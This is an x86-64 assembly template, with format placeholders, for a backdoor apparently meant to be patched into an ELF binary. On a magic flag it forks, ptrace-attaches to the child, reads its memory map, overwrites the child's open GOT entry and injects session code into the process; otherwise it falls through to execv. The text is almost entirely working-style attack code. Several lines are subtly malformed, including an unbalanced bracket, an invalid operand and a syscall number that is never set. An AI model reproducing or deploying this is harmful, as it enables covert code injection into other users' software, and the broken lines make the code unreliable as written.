push rdi
push rsi
push rdx
push rcx
push rbx
push r10
push r8
push rax

mov r8, %lx
// elf_base
mov r9, r8
add r9, %lx
// elf_base + rw_gap
mov rbx, r8
add rbx, %lx
// elf_base + rx_gap
mov ax, [r9]
cmp ax, 0x3316
jne return_normal
// if flag == 0x3316, trigger backdoor

backdoor:
push 0x39
pop rax
// SYS_fork
syscall
// fork
cmp rax, 0x0
je return_normal

tracer:
mov dword ptr [r9 + {pid}], eax
// pid

push 0x65
pop rax
// SYS_ptrace
push 0x10
pop rdi
// PTRACE_ATTACH
mov esi, [r9 + {pid}]
// pid
syscall
// ptrace (PTRACE_ATTACH, pid, NULL, NULL) 

push 0x3d
pop rax
// SYS_wait
syscall
// wait (NULL)

mov ecx, [r9 + [{pid}]
// pid
push 0x18
pop rsi
// 0x20
mov rax, 0x2f6d617073
push rax
mov rax, 0x2f70726f632f2564
push rax
push rsp
pop rdx
// "/proc/%d/maps"
lea rdi, [r9 + {map_str}]
// rw_gap + 8
call [r8 + %lx]
// %lx = snprintf_got
// snprintf (rw_gap + map_str, 0x18, "/proc/%d/maps", pid)

push 0x2
pop rax
// SYS_open
push 0x0
pop rsi
// O_RDONLY
syscall
// open (rw_gap + map_str, O_RDONLY)

push rdi
pop rsi
// rw_gap + map_str
push rax
pop rdi
// fd
push 0x0
pop rax
// SYS_read
push 0xc
pop rdx
// 0xc
syscall
// read (fd, rw_gap + map_str, 0xc)

lea rdi, [r9 + {map_str}]
// rw_gap + map_str
push 0x0
pop rsi
// NULL
push 0x10
pop rdx
// 0x10
call [r8 + %lx]
// %lx = strtoul_got
// strtoul (rw_gap + {map_str}, NULL, 0x10)

mov qword ptr [r9 + {session_elf_base}], rax
// [rw_gap + {session_elf_base}] = session_elf_base

lea r10, [r9 + {session_elf_base} + %lx]
// %lx = session_rx_gap
push 0x5
pop rdi
// PTRACE_POKEDATA
mov rsi, [r9 + {pid}]
// pid

lea rdx, [r8 + %lx]
// %lx = open_got
syscall
// ptrace (PTRACE_POKEDATA, pid, open_got, session_rx_gap)

mov rdx, r10
// session_rx_gap
lea r10, [rw_gap + {code_start}]
// code_start
mov r8, %lx
// %lx = sizeof (session_code)

loop:
add rdx, 8
add r10, 8
syscall
// ptrace (PTRACE_POKEDATA, pid, session_rx_gap + idx, rw_gap + code_start + idx)
cmp rdx, %lx
jl loop

push 0x3c
pop rax
push 0x0
pop rdi
syscall
// exit (0)

return_normal:

pop rax
pop r8
pop r10
pop rbx
pop rcx
pop rdx
pop rsi
pop rdi
call [r9 + %lx]
// %lx = execv_got

ret
